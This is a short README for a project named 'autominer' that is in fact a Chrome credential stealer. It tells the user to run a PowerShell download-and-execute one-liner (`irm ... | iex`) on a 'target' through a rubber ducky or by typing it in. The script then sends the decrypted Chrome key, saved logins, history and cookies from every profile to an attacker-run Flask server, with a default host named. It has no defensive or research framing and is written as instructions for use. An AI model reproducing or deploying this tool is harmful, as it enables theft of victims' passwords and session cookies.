# autominer
this is one of the projects that I worked on when I had time.

activate `irm [url to get script] | iex` on target with a rubber ducky, or by typing into a PowerShell window.

`get` is a PowerShell script.


run `upload.py` as a server to get data from the target.

also, change url in `get` to your server instead of `lucasz228.us.to`


`get` sends 
- decrypted chrome AES key
- chrome login data from all profiles
- chrome history from all profiles
- chrome cookies from all profiles

to the server.


## install:
```pip install flask
pip install pysqlite3
pip install requests
pip install pycryptodomex
pip install pypiwin32
```
